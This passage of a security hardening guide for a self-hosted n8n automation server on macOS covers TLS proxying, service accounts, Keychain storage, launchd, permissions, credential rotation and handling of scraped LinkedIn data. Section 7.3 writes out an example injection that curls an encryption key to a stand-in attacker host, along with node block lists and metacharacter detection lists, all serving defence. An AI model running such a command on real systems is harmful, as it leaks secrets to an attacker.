**Source**: [OWASP A02 Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/), [NIST SP 800-123 §4](https://csrc.nist.gov/publications/detail/sp/800-123/final)

#### Why This Matters

n8n does not support TLS natively. Exposing n8n directly to the internet means credentials are transmitted in cleartext, and the full attack surface (UI, API, webhooks) is reachable without rate limiting or request logging.

#### How to Harden

**Option A — SSH tunnel (preferred for occasional remote access):**

```bash
# From your workstation — no additional software needed
ssh -L 5678:localhost:5678 user@mac-mini-ip
# Then open http://localhost:5678 in your browser
```

SSH tunneling provides encryption and authentication with zero additional configuration.

**Option B — Caddy reverse proxy (for persistent remote access or webhook ingress):**

```bash
brew install caddy
```

Create a Caddyfile:

```text
your-domain.com {
    # Only expose webhook paths externally
    handle /webhook/* {
        reverse_proxy localhost:5678
    }

    # Block API and other paths from external access
    handle /api/* {
        respond 403
    }
    handle /rest/* {
        respond 403
    }

    # Optionally expose UI with basic auth
    handle {
        basicauth {
            operator $2a$14$... # bcrypt hash
        }
        reverse_proxy localhost:5678
    }

    log {
        output file /var/log/caddy/access.log
    }
}
```

Caddy automatically obtains and renews TLS certificates via Let's Encrypt.

**Containerized reverse proxy:**

For containerized deployments, add Caddy as a second container in the same Compose stack. The n8n container does NOT need to be port-mapped to the host — Caddy communicates with n8n over the internal Docker network.

**nginx** (alternative to Caddy, free, widely documented):

```bash
brew install nginx
```

nginx requires manual TLS certificate management (use `certbot` for Let's Encrypt).

#### Verification

```bash
# Verify n8n is NOT directly exposed to non-localhost
sudo lsof -iTCP:5678 -sTCP:LISTEN -P -n 2>/dev/null
# Expected: bound to 127.0.0.1, not 0.0.0.0

# Verify reverse proxy is handling external traffic
curl -I https://your-domain.com 2>/dev/null | head -5
# Expected: HTTP/2 200 with valid TLS certificate
```

### 5.9 Update and Migration Security

**Threat**: n8n version upgrade silently changes security defaults, resets environment variables, or introduces new code-execution-capable node types
**Layer**: Prevent
**Deployment**: Both
**Source**: [NIST SP 800-40 Rev 4](https://csrc.nist.gov/publications/detail/sp/800-40/rev-4/final)

#### Why This Matters

n8n version upgrades can silently change security-relevant defaults, introduce new node types, or run database migrations that alter how credentials are stored. Upgrading without verification can undo hardening work.

#### How to Harden

**Pre-update checklist:**

1. Back up the n8n database and credentials (§9.3)
2. Record current workflow baseline hash (§8.3)
3. Review n8n release notes for security-relevant changes
4. For containerized: record the current image digest

```bash
# Record current image digest before updating
docker inspect n8nio/n8n --format '{{index .RepoDigests 0}}' 2>/dev/null
```

**Containerized update procedure:**

```bash
# Pull new image
docker compose pull n8n

# Stop and recreate (compose file security options are preserved)
docker compose down
docker compose up -d

# Run post-update verification
```

**Bare-metal update procedure:**

```bash
# Update n8n
npm update -g n8n

# Run post-update verification
```

**Post-update verification:**

1. Run the audit script: `scripts/hardening-audit.sh`
2. Verify security env vars are still applied (§5.3)
3. Verify disabled node types remain disabled (`NODES_EXCLUDE`)
4. Check that credentials still decrypt correctly
5. Verify workflow baseline has not changed unexpectedly

**Rollback procedure:**

```bash
# Containerized: restore previous image
docker compose down
# Edit docker-compose.yml to use previous image digest
docker compose up -d

# Bare-metal: install specific version
npm install -g n8n@<previous-version>

# Restore database from pre-update backup if needed
```

#### Edge Cases and Warnings

- **v2.0 breaking changes**: `EXECUTIONS_PROCESS` was removed — setting it causes startup failure. `N8N_BLOCK_ENV_ACCESS_IN_NODE` defaults changed to `true`.
- **Database migrations**: Some upgrades modify the database schema. Ensure backups are taken before upgrading.
- **Compose file preservation**: Never modify the compose file's security options during an update. Only change the image tag/digest.

---

## 6. Bare-Metal Path (Prevent) — Bare-Metal Only

### 6.1 Dedicated Service Account

**Threat**: n8n running as the operator's admin account gives a compromised workflow full access to home directory, SSH keys, macOS Keychain, and the ability to install persistent backdoors
**Layer**: Prevent
**Deployment**: Bare-metal only
**Source**: [NIST SP 800-123 §4.1](https://csrc.nist.gov/publications/detail/sp/800-123/final) (Least Privilege), [CIS Apple macOS Benchmarks](https://www.cisecurity.org/benchmark/apple_os) (User Account Controls), [MITRE ATT&CK T1078.001](https://attack.mitre.org/techniques/T1078/001/)

#### Why This Matters

On bare-metal without a service account, a compromised n8n process runs as the operator's admin user — it can read SSH keys, access the login Keychain, write to system directories, and install launch agents for persistence. A dedicated service account is the bare-metal equivalent of container isolation (§4): it limits the blast radius of a compromise to only the n8n data directory.

#### How to Harden

**Create the dedicated `_n8n` service account:**

```bash
# Create service account with no login shell
# The underscore prefix follows macOS convention for service accounts
sudo sysadminctl -addUser _n8n -fullName "n8n Service" -shell /usr/bin/false -home /var/empty

# Verify the account was created
dscl . -read /Users/_n8n
```

> **NOTE**: `sysadminctl` requires admin privileges and may prompt for the admin password. On macOS Sonoma 14.x+, use `-password -` to skip setting a password (the account will have no password and cannot be used for login).

**Restrict group memberships:**

```bash
# Verify the service account is NOT in the admin group
dseditgroup -o checkmember -m _n8n admin
# Expected: "no _n8n is NOT a member of admin"

# Remove from staff group if present (limits file access)
sudo dseditgroup -o edit -d _n8n -t user staff 2>/dev/null || true
```

**Prevent interactive login:**

The `/usr/bin/false` shell prevents SSH and terminal login. Additionally:

```bash
# Verify shell is non-interactive
dscl . -read /Users/_n8n UserShell
# Expected: UserShell: /usr/bin/false

# Verify account cannot SSH in (if SSH is enabled)
# Add to DenyUsers in /etc/ssh/sshd_config.d/hardening.conf:
#   DenyUsers _n8n
```

**Create the n8n data directory:**

```bash
# Create dedicated data directory
sudo mkdir -p /opt/n8n/data /opt/n8n/logs /opt/n8n/backups

# Set ownership to service account
sudo chown -R _n8n:_n8n /opt/n8n

# Restrict permissions (owner only — no group or world access)
sudo chmod 700 /opt/n8n /opt/n8n/data /opt/n8n/logs /opt/n8n/backups
```

**TCC permissions:**

The `_n8n` service account should have NO TCC (Transparency, Consent, and Control) permissions:

```bash
# Verify no TCC grants for the service account
# Check the TCC database (requires Full Disk Access for the querying user)
sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
    "SELECT client FROM access WHERE client LIKE '%n8n%';" 2>/dev/null
# Expected: no results
```

Never grant Full Disk Access, Accessibility, or other TCC permissions to the n8n process or the `_n8n` user. If n8n is compromised and running as a user with Full Disk Access, the attacker can read any file on the system.

#### Verification

```bash
# Verify service account exists and has correct shell
dscl . -read /Users/_n8n UserShell 2>/dev/null
# Expected: UserShell: /usr/bin/false

# Verify account is not in admin group
dseditgroup -o checkmember -m _n8n admin 2>/dev/null
# Expected: NOT a member

# Verify n8n runs as _n8n (not admin)
ps -eo user,pid,command | grep "[n]8n" 2>/dev/null
# Expected: _n8n PID /path/to/n8n
```

#### Edge Cases and Warnings

- **Home directory**: Use `/var/empty` (read-only, no home) not `/Users/_n8n`. Creating a full home directory grants unnecessary filesystem access.
- **Multi-operator scenario**: If multiple admins manage the Mac Mini, designate one as the security owner responsible for the `_n8n` account. Other operators should use non-admin accounts for daily use (§2.6).
- **macOS upgrades**: Verify the `_n8n` account survives macOS major version upgrades. Check account existence and permissions after each upgrade (§10.3).
- **Deleting the account**: If migrating to containerized: `sudo sysadminctl -deleteUser _n8n`. This removes the account but not the data directory — archive or securely delete `/opt/n8n` separately.

**Audit check**: `CHK-SERVICE-ACCOUNT` (FAIL) → §6.1

### 6.2 Keychain Integration

**Threat**: n8n credentials stored in environment variables or plaintext files are visible via `ps aux`, `/proc`, or `docker inspect`; login Keychain auto-unlock exposes all credentials to any process running as the same user
**Layer**: Prevent
**Deployment**: Bare-metal only
**Source**: [Apple Developer Documentation — Keychain Services](https://developer.apple.com/documentation/security/keychain_services), [CIS Apple macOS Benchmarks](https://www.cisecurity.org/benchmark/apple_os) (Keychain Configuration), [MITRE ATT&CK T1555.001](https://attack.mitre.org/techniques/T1555/001/) (Credentials from Keychain)

#### Why This Matters

The macOS Keychain is more secure than environment variables (visible via `ps`) or plaintext config files, but its security model has nuances. The login Keychain auto-unlocks at login, so any process running as the same user can request access. Using a separate, locked Keychain with explicit ACLs limits credential exposure to only the n8n process.

> **NOTE**: For containerized deployments, use Docker secrets (§4.3) — NOT the macOS Keychain. Do not mount the Keychain into a Docker container.

#### How to Harden

**Create a separate Keychain for n8n credentials:**

```bash
# Create dedicated Keychain (NOT the login Keychain)
# Use a strong, unique password — not the macOS login password
sudo -u _n8n security create-keychain -p "$(openssl rand -base64 32)" \
    /opt/n8n/n8n.keychain-db

# Set auto-lock timeout (lock after 5 minutes of inactivity)
sudo -u _n8n security set-keychain-settings -t 300 -l \
    /opt/n8n/n8n.keychain-db
```

**Store n8n credentials in the dedicated Keychain:**

```bash
# Store the n8n encryption key
sudo -u _n8n security add-generic-password \
    -a "n8n" \
    -s "N8N_ENCRYPTION_KEY" \
    -w "$(cat /path/to/encryption-key.txt)" \
    -T "/usr/local/bin/n8n" \
    /opt/n8n/n8n.keychain-db

# Store other credentials similarly
sudo -u _n8n security add-generic-password \
    -a "n8n" \
    -s "APIFY_API_KEY" \
    -w "$(cat /path/to/apify-key.txt)" \
    -T "/usr/local/bin/n8n" \
    /opt/n8n/n8n.keychain-db
```

The `-T` flag restricts access to only the specified application path (ACL).

**Retrieve credentials in the launchd pre-start script:**

```bash
#!/bin/bash
# /opt/n8n/start-n8n.sh — called by launchd plist (§6.3)
set -euo pipefail

# Unlock the n8n Keychain (password read from a protected file)
security unlock-keychain -p "$(cat /opt/n8n/.keychain-password)" \
    /opt/n8n/n8n.keychain-db

# Export credentials as environment variables for the n8n process
export N8N_ENCRYPTION_KEY
N8N_ENCRYPTION_KEY=$(security find-generic-password \
    -a "n8n" -s "N8N_ENCRYPTION_KEY" -w \
    /opt/n8n/n8n.keychain-db)

# Start n8n
exec /usr/local/bin/n8n start
```

> **WARNING**: The Keychain unlock password file (`/opt/n8n/.keychain-password`) must be:
>
> - Owned by `_n8n:_n8n` with permissions `400` (read-only by owner)
> - NOT the same password as the macOS login or any other credential
> - Backed up securely (§9.3) — if lost, you must recreate the Keychain and re-enter all credentials

**Keychain security settings:**

```bash
# Verify Keychain auto-lock is configured
sudo -u _n8n security show-keychain-info /opt/n8n/n8n.keychain-db 2>&1
# Expected: "timeout=300 lock-on-sleep"

# Lock Keychain when n8n is not running
sudo -u _n8n security lock-keychain /opt/n8n/n8n.keychain-db
```

#### Keychain vs Other Credential Storage

| Method | Security | Visibility | Recommended |
|--------|----------|------------|-------------|
| **Separate Keychain with ACLs** | Strong — encrypted, access-controlled | Not visible in process listings | Yes (bare-metal) |
| **Docker secrets** | Strong — mounted at `/run/secrets/` | Not visible in `docker inspect` env | Yes (containerized) |
| **Environment variables** | Weak — visible in `ps aux`, `/proc` | Exposed to all same-user processes | No |
| **Plaintext config files** | Weak — readable by anyone with file access | On disk in cleartext | No |
| **Bitwarden CLI** (free) | Strong — encrypted vault | Requires manual unlock | Alternative |

#### Verification

```bash
# Verify separate Keychain exists
sudo -u _n8n security list-keychains 2>/dev/null | grep n8n
# Expected: "/opt/n8n/n8n.keychain-db"

# Verify Keychain is not the login Keychain
sudo -u _n8n security default-keychain 2>/dev/null
# Expected: should NOT be n8n.keychain-db

# Verify auto-lock is configured
sudo -u _n8n security show-keychain-info /opt/n8n/n8n.keychain-db 2>&1
# Expected: timeout value set
```

#### Edge Cases and Warnings

- **Headless server**: With no GUI session, Keychain prompts are suppressed or fail silently. The launchd pre-start script MUST unlock the Keychain programmatically — do not rely on login Keychain auto-unlock.
- **Keychain corruption**: If the Keychain file is corrupted, n8n will fail to start. Keep a backup of the Keychain file (encrypted, §9.3) and document all stored credential names.
- **Credential reuse**: Use a unique password for each credential — not the macOS login, SSH key passphrase, or any other service password. Use Bitwarden CLI (free) for generating unique credentials.
- **Keychain and Time Machine**: Time Machine backs up Keychain files. If Time Machine backups are accessible to other users or unencrypted, credentials are exposed. See §9.3 for backup encryption.

### 6.3 launchd Execution

**Threat**: n8n running as a login item under the admin user inherits full admin privileges and stops when the user logs out; secrets passed as command-line arguments are visible in `ps aux` to all users
**Layer**: Prevent
**Deployment**: Bare-metal only
**Source**: [Apple Developer Documentation — Creating Launch Daemons and Agents](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html), [NIST SP 800-123 §4.3](https://csrc.nist.gov/publications/detail/sp/800-123/final)

#### Why This Matters

Running n8n as a launch daemon (via `launchd`) ensures it starts at boot, runs as the dedicated `_n8n` service account, and survives user logouts. Using a launchd plist instead of a shell alias or login item also prevents accidental exposure of secrets via command-line arguments.

#### How to Harden

**Create the launchd plist:**

Create `/Library/LaunchDaemons/com.openclaw.n8n.plist`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.openclaw.n8n</string>

    <!-- Run as dedicated service account (FR-036) -->
    <key>UserName</key>
    <string>_n8n</string>
    <key>GroupName</key>
    <string>_n8n</string>

    <!-- Start script handles Keychain unlock + env vars (§6.2) -->
    <!-- NEVER pass secrets as ProgramArguments — visible in ps aux (SC-043) -->
    <key>ProgramArguments</key>
    <array>
        <string>/opt/n8n/start-n8n.sh</string>
    </array>

    <!-- Working directory for n8n data -->
    <key>WorkingDirectory</key>
    <string>/opt/n8n/data</string>

    <!-- Start at boot, restart on crash -->
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>

    <!-- Logging — timestamped output for audit trail -->
    <key>StandardOutPath</key>
    <string>/opt/n8n/logs/n8n-stdout.log</string>
    <key>StandardErrorPath</key>
    <string>/opt/n8n/logs/n8n-stderr.log</string>

    <!-- Environment variables (non-sensitive only) -->
    <!-- Sensitive values loaded by start-n8n.sh from Keychain -->
    <key>EnvironmentVariables</key>
    <dict>
        <key>N8N_HOST</key>
        <string>localhost</string>
        <key>N8N_PORT</key>
        <string>5678</string>
        <key>N8N_USER_FOLDER</key>
        <string>/opt/n8n/data</string>
        <key>N8N_LOG_LEVEL</key>
        <string>info</string>
        <key>N8N_BLOCK_ENV_ACCESS_IN_NODE</key>
        <string>true</string>
        <key>N8N_RESTRICT_FILE_ACCESS_TO</key>
        <string>/opt/n8n/data</string>
        <key>N8N_PUBLIC_API_DISABLED</key>
        <string>true</string>
        <key>N8N_MFA_ENABLED</key>
        <string>true</string>
        <key>N8N_DIAGNOSTICS_ENABLED</key>
        <string>false</string>
        <key>N8N_TEMPLATES_ENABLED</key>
        <string>false</string>
        <key>N8N_VERSION_NOTIFICATIONS_ENABLED</key>
        <string>false</string>
        <key>N8N_PERSONALIZATION_ENABLED</key>
        <string>false</string>
        <key>EXECUTIONS_DATA_SAVE_ON_ERROR</key>
        <string>all</string>
        <key>EXECUTIONS_DATA_SAVE_ON_SUCCESS</key>
        <string>none</string>
        <key>NODES_EXCLUDE</key>
        <string>["n8n-nodes-base.executeCommand","n8n-nodes-base.ssh","n8n-nodes-base.localFileTrigger"]</string>
    </dict>

    <!-- Resource limits -->
    <key>SoftResourceLimits</key>
    <dict>
        <!-- Disable core dumps (FR-068) -->
        <key>Core</key>
        <integer>0</integer>
    </dict>
    <key>HardResourceLimits</key>
    <dict>
        <key>Core</key>
        <integer>0</integer>
    </dict>
</dict>
</plist>
```

**Load and manage the service:**

```bash
# Set correct ownership and permissions on the plist
sudo chown root:wheel /Library/LaunchDaemons/com.openclaw.n8n.plist
sudo chmod 644 /Library/LaunchDaemons/com.openclaw.n8n.plist

# Load the daemon (starts n8n)
sudo launchctl load /Library/LaunchDaemons/com.openclaw.n8n.plist

# Verify it is running
sudo launchctl list | grep com.openclaw.n8n
# Expected: PID  0  com.openclaw.n8n  (PID column shows a number, exit code 0)

# Stop n8n
sudo launchctl unload /Library/LaunchDaemons/com.openclaw.n8n.plist

# Restart n8n
sudo launchctl unload /Library/LaunchDaemons/com.openclaw.n8n.plist
sudo launchctl load /Library/LaunchDaemons/com.openclaw.n8n.plist
```

> **WARNING**: Never pass secrets (encryption keys, API tokens, passwords) as `ProgramArguments` or inline in the plist's `EnvironmentVariables`. These are visible in `ps aux` and `launchctl print`. Use the Keychain-based start script (§6.2) to inject secrets at runtime.

#### Verification

```bash
# Verify daemon is loaded and running
sudo launchctl list | grep com.openclaw.n8n
# Expected: shows PID and exit status 0

# Verify n8n runs as _n8n user
ps -eo user,pid,command | grep "[n]8n"
# Expected: _n8n  <PID>  /usr/local/bin/n8n start

# Verify no secrets in process arguments
ps -p "$(pgrep -f 'n8n start')" -o args= 2>/dev/null
# Expected: no encryption keys, passwords, or tokens visible
```

#### Edge Cases and Warnings

- **`StartCalendarInterval` during sleep**: If using a scheduled start (not `KeepAlive`), `launchd` runs the job at the next wake if the scheduled time passed during sleep.
- **Plist syntax errors**: Use `plutil -lint /Library/LaunchDaemons/com.openclaw.n8n.plist` to validate XML before loading.
- **Log rotation**: launchd does not rotate logs. Configure `newsyslog` or a manual rotation script for `/opt/n8n/logs/` (§10.4).
- **`launchctl bootstrap` vs `load`**: On macOS 10.11+, Apple recommends `launchctl bootstrap system /path/to/plist`. Both work; `load` is more widely documented.

### 6.4 Filesystem Permissions

**Threat**: Overly permissive file permissions allow other users or compromised processes to read n8n credentials, modify workflows, or tamper with the n8n binary
**Layer**: Prevent
**Deployment**: Bare-metal only
**Source**: [CIS Apple macOS Benchmarks](https://www.cisecurity.org/benchmark/apple_os) (File Permissions), [NIST SP 800-123 §4.2](https://csrc.nist.gov/publications/detail/sp/800-123/final)

#### Why This Matters

The `_n8n` service account's data directory contains the SQLite database with encrypted credentials, workflow definitions, and execution logs (which may contain PII). If other users can read these files, they can extract the encrypted database and attempt offline decryption. If they can write, they can inject malicious workflows.

#### How to Harden

**Set restrictive permissions on all n8n directories and files:**

```bash
# Directory permissions: 700 (owner only)
sudo chmod 700 /opt/n8n
sudo chmod 700 /opt/n8n/data
sudo chmod 700 /opt/n8n/logs
sudo chmod 700 /opt/n8n/backups

# File permissions: 600 (owner read/write only)
sudo find /opt/n8n -type f -exec chmod 600 {} \;

# Start script must be executable
sudo chmod 700 /opt/n8n/start-n8n.sh

# Keychain password file: 400 (owner read only)
sudo chmod 400 /opt/n8n/.keychain-password

# Keychain file: 600 (owner read/write)
sudo chmod 600 /opt/n8n/n8n.keychain-db

# Ensure all files owned by _n8n
sudo chown -R _n8n:_n8n /opt/n8n
```

**Verify the operator's home directory is not accessible:**

```bash
# Verify _n8n cannot read admin home directory
sudo -u _n8n ls /Users/$(whoami)/ 2>&1
# Expected: "Permission denied" or "Operation not permitted"

# Verify _n8n cannot access SSH keys
sudo -u _n8n cat /Users/$(whoami)/.ssh/id_ed25519 2>&1
# Expected: "Permission denied"

# Verify _n8n cannot access login Keychain
sudo -u _n8n security dump-keychain ~/Library/Keychains/login.keychain-db 2>&1
# Expected: error or permission denied
```

**Temp file isolation:**

```bash
# n8n uses /var/folders/ for temp files by default
# Set TMPDIR to a dedicated temp directory owned by _n8n
sudo mkdir -p /opt/n8n/tmp
sudo chown _n8n:_n8n /opt/n8n/tmp
sudo chmod 700 /opt/n8n/tmp

# Add to launchd plist EnvironmentVariables:
#   <key>TMPDIR</key>
#   <string>/opt/n8n/tmp</string>
```

This prevents n8n temp files (which may contain PII from workflow executions) from being written to shared temp directories.

**n8n binary integrity:**

```bash
# If n8n was installed via npm globally, verify installation path
which n8n
# Record the path and set immutable flag (if supported)

# Verify n8n binary is not writable by non-root
ls -la "$(which n8n)"
# Expected: owned by root, not world-writable
```

#### Verification

```bash
# Check data directory permissions
stat -f "%A %Su:%Sg %N" /opt/n8n/data 2>/dev/null
# Expected: 700 _n8n:_n8n /opt/n8n/data

# Check for world-readable files in n8n directory
find /opt/n8n -perm -o+r -type f 2>/dev/null
# Expected: no output (no world-readable files)

# Verify blast radius — _n8n can only access its own directory
sudo -u _n8n find / -writable -not -path "/opt/n8n/*" -not -path "/dev/*" 2>/dev/null | head -5
# Expected: no results (or only expected system paths)
```

#### Edge Cases and Warnings

- **npm global install**: If n8n is installed via `npm install -g`, it may be in `/usr/local/lib/node_modules/` which is world-readable. This is acceptable — the binary itself is not sensitive. The data directory (`/opt/n8n/data`) is what needs protection.
- **macOS updates**: Major macOS updates may reset permissions on system directories. Re-verify `/opt/n8n` permissions after every update (§10.3).
- **Backup permissions**: Backup files (§9.3) must NOT be readable by the `_n8n` account. If n8n is compromised, the attacker should not be able to access or modify backups. Store backups in a directory owned by the admin user with `700` permissions.
- **Spotlight indexing**: Exclude `/opt/n8n` from Spotlight to prevent PII in workflow data from appearing in search results:

```bash
sudo mdutil -i off /opt/n8n
```

**Audit checks**: `CHK-SERVICE-HOME-PERMS` (FAIL), `CHK-SERVICE-DATA-PERMS` (FAIL) → §6.4

---

## 7. Data Security (Prevent)

### 7.1 Credential Management

**Threat**: Credentials stored in plaintext files, environment variables, or command-line arguments are visible to any process with sufficient access — enabling credential theft without exploitation
**Layer**: Prevent
**Deployment**: Both
**Source**: [NIST SP 800-63B](https://csrc.nist.gov/publications/detail/sp/800-63b/final) (Digital Identity Guidelines), [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html), [MITRE ATT&CK T1552](https://attack.mitre.org/techniques/T1552/)

#### Why This Matters

This deployment manages multiple high-value credentials. The `N8N_ENCRYPTION_KEY` is the single master secret — anyone with this key and the n8n database can decrypt all stored credentials. Proper storage differs by deployment path: Docker secrets for containerized, Keychain for bare-metal.

#### How to Harden

**Credential inventory** — every credential in this deployment:

| Credential | Type | Containerized Storage | Bare-Metal Storage | Blast Radius |
|-----------|------|----------------------|-------------------|--------------|
| `N8N_ENCRYPTION_KEY` | encryption_key | Docker secret | Keychain (§6.2) | Decrypts ALL stored n8n credentials |
| `N8N_USER_MANAGEMENT_JWT_SECRET` | secret | Docker secret | Keychain | Session hijacking, account takeover |
| LinkedIn session token | token | n8n credential store | n8n credential store | LinkedIn account access, scraping |
| Apify API key | api_key | n8n credential store | n8n credential store | Full Apify account access |
| SSH private key | certificate | N/A (host-level) | N/A (host-level) | Remote Mac Mini access |
| SMTP relay credentials | password | Docker secret or n8n | Keychain or n8n | Email sending, phishing vector |
| n8n API key (if enabled) | api_key | n8n credential store | n8n credential store | Workflow CRUD, credential access |

**Per-path storage guidance:**

- **Containerized**: Use Docker secrets for `N8N_ENCRYPTION_KEY` and `JWT_SECRET` (§4.3). Store service credentials (LinkedIn, Apify) in n8n's built-in credential manager, which encrypts them with the encryption key.
- **Bare-metal**: Use a separate Keychain with ACLs (§6.2) for `N8N_ENCRYPTION_KEY`. Store service credentials in n8n's credential manager.
- **Never**: Store credentials in plaintext config files, git repositories, shell history, or clipboard managers.

**Generate strong credentials:**

```bash
# Generate a random encryption key
openssl rand -hex 32

# Generate a random JWT secret
openssl rand -hex 32
```

**Credential reuse warning**: Use a unique password for every service — the Mac Mini login, n8n web UI, SMTP, and all API keys must be different. Credential reuse is the #1 enabler of lateral movement. Use Bitwarden CLI (free) for generating and managing unique credentials:

```bash
brew install bitwarden-cli
bw generate -ulns --length 32
```

#### Verification

```bash
# Containerized: verify no secrets in container environment
docker inspect "$(docker ps -q --filter name=n8n)" \
    --format '{{json .Config.Env}}' 2>/dev/null | \
    grep -iE 'ENCRYPTION_KEY=|PASSWORD=|SECRET=|TOKEN=.*[a-zA-Z0-9]{8}'
# Expected: no matches (secrets should be in /run/secrets/)

# Bare-metal: verify no secrets in process arguments
ps -p "$(pgrep -f 'n8n start' 2>/dev/null)" -o args= 2>/dev/null
# Expected: no encryption keys, passwords, or tokens visible
```

**Audit checks**: `CHK-CRED-ENV-VISIBLE` (WARN) → §7.1

### 7.2 Credential Lifecycle

**Threat**: Stale credentials that are never rotated give attackers an unlimited window to exploit stolen credentials; missing revocation procedures delay incident response
**Layer**: Prevent
**Deployment**: Both
**Source**: [NIST SP 800-63B §5.1](https://csrc.nist.gov/publications/detail/sp/800-63b/final) (Authenticator Lifecycle), [MITRE ATT&CK T1078](https://attack.mitre.org/techniques/T1078/) (Valid Accounts), [MITRE ATT&CK T1528](https://attack.mitre.org/techniques/T1528/) (Steal Application Access Token)

#### Why This Matters

Credentials that are never rotated give attackers an unlimited exploitation window — a stolen Apify API key works until it is revoked. Without a rotation schedule and revocation procedure, incident response becomes trial-and-error under time pressure.

#### How to Harden

**Rotation schedule:**

| Credential | Rotation Interval | Procedure | What Breaks |
|-----------|-------------------|-----------|-------------|
| `N8N_ENCRYPTION_KEY` | Annually | Re-encrypt database first (§9.2) | All stored credentials decrypt |
| LinkedIn session token | Every 90 days or on forced re-auth | Re-authenticate in browser, update n8n credential | Scraping workflows pause |
| Apify API key | Every 90 days | Regenerate in Apify dashboard, update n8n credential | Apify actor triggers fail |
| SSH key | Annually | Generate new key, deploy public key, remove old | SSH access temporarily interrupted |
| SMTP credentials | Per provider policy | Update in provider portal, update n8n credential | Notification emails fail |
| n8n API key | Every 90 days (if enabled) | Regenerate in n8n Settings > API | API integrations fail |
| `JWT_SECRET` | Annually | Update env var, restart n8n | All active sessions invalidated |

**Emergency rotation**: If any credential is suspected compromised, rotate ALL credentials within 2 hours using the emergency rotation runbook (§9.2). Practice the rotation procedure before an incident occurs.

**Expiry detection:**

- LinkedIn sessions expire silently — monitor for scraping workflow failures
- Apify API keys do not expire unless rotated
- SSH keys do not expire — track creation date and rotate manually

#### Edge Cases and Warnings

- **`N8N_ENCRYPTION_KEY` rotation**: This is the most critical rotation. You MUST re-encrypt the database before changing the key, or all stored credentials become permanently inaccessible. See §9.2 for the procedure.
- **Credential inventory maintenance**: Keep the inventory (§7.1) updated whenever credentials are added, rotated, or removed. This is essential for incident response.

### 7.3 Scraped Data Input Security

**Threat**: Scraped LinkedIn data containing shell metacharacters, prompt injection payloads, or malicious URLs reaches n8n code execution nodes, achieving remote code execution
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A03 Injection](https://owasp.org/Top10/A03_2021-Injection/), [OWASP LLM Top 10 — LLM01 Prompt Injection](https://owasp.org/www-project-top-10-for-large-language-model-applications/), [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/)

#### Why This Matters

ALL data entering n8n from Apify actors must be treated as adversarial. LinkedIn profiles are editable by anyone — an attacker can place shell metacharacters, SQL injection, or prompt injection payloads in their job title, company name, or summary. The attack surface is the boundary where scraped data crosses from "being processed" to "influencing code execution."

**Data flow through the deployment:**

1. Apify actor scrapes LinkedIn → returns structured data via API
2. n8n trigger/webhook receives Apify response
3. n8n transformation nodes process data (Set, IF, Switch, Merge — **safe**, no code execution)
4. **Danger zone**: data reaches a code execution node (Code, Execute Command, SSH, AI Agent)
5. Output: data stored, sent via email/webhook, or written to database

**Concrete attack chain:**

1. Attacker sets LinkedIn job title to: `` `; curl attacker.com/exfil?key=$(cat /run/secrets/n8n_encryption_key)` ``
2. Apify scrapes the profile
3. n8n Code node processes: `` const result = `Processing ${item.jobTitle}` ``
4. Backtick interpolation executes the attacker's shell command

#### How to Harden

**Workflow audit checklist** — review every workflow that processes scraped data:

| Node Type | Risk | Action |
|-----------|------|--------|
| **Code** | JavaScript/Python execution | Never interpolate scraped data into code strings |
| **Execute Command** | Shell execution | Block via `NODES_EXCLUDE` (§5.6) |
| **SSH** | Remote shell | Block via `NODES_EXCLUDE` |
| **HTTP Request** | SSRF vector | Use allowlisted base URLs only (§7.5) |
| **AI Agent / LangChain** | Prompt injection | Structural data/prompt separation |
| **Set / IF / Switch / Merge** | None (data only) | Safe — no code execution |

**Safe patterns:**

- Treat all scraped fields as data, never code: `JSON.stringify(item.jobTitle)` not template literals
- Validate data types and lengths before processing
- In Code nodes, use explicit property access: `items[0].json.jobTitle` (not dynamic eval)
- Never chain LLM output to code execution nodes
- Never allow LLM output to call the n8n API

**Prompt injection defense** (if using AI/LLM nodes):

- Pass scraped data as clearly delimited data fields, never concatenated into prompt text
- Validate LLM output against an expected schema before acting on it
- Include system prompt instructions to ignore embedded directives (weak control — speed bump, not wall)

**Detection**: Enable n8n execution logging to record all workflow inputs/outputs. Monitor for:

- Unexpected outbound connections from the container or host
- Shell metacharacters in scraped data fields (`$()`, backticks, `&&`, `||`, `;`, `|`)
- Unusual file access outside expected paths

> **WARNING** (bare-metal): Without containerization, successful injection gives the attacker full access to the operator's home directory, SSH keys, macOS Keychain, and the ability to install persistent backdoors. Containerization is the single most important control for deployments processing scraped web data.

**Audit check**: `CHK-N8N-NODES` (WARN) → §5.6 (cross-reference — node exclusion check)

### 7.4 PII Protection

**Threat**: Scraped LinkedIn data constitutes PII subject to GDPR, CCPA, and LinkedIn Terms of Service; uncontrolled retention, storage, and access expand breach impact and legal exposure
**Layer**: Prevent
**Deployment**: Both
**Source**: [GDPR Article 32](https://gdpr-info.eu/art-32-gdpr/), [CCPA Section 1798.150](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?sectionNum=1798.150.&lawCode=CIV), [NIST SP 800-122](https://csrc.nist.gov/publications/detail/sp/800-122/final)

#### Why This Matters

This deployment scrapes LinkedIn profiles — personal data that may include names, emails, phone numbers, employment history, and location. A data breach requires notification within 72 hours (GDPR) or promptly (CCPA), with potential statutory damages. Minimizing what PII is collected and retained reduces both breach impact and legal exposure.

#### How to Harden

**Data classification** — PII fields in this deployment:

| Field | Sensitivity | Source | GDPR Relevant |
|-------|------------|--------|---------------|
| full_name | semi-private | LinkedIn | Yes |
| email | semi-private | LinkedIn/enrichment | Yes |
| phone | semi-private | Enrichment | Yes |
| job_title | public | LinkedIn | Yes |
| company_name | public | LinkedIn | Yes |
| profile_url | public | LinkedIn | Yes |
| location | semi-private | LinkedIn | Yes |
| employment_history | semi-private | LinkedIn | Yes |
| education | semi-private | LinkedIn | Yes |
| profile_photo | public | LinkedIn | Yes |
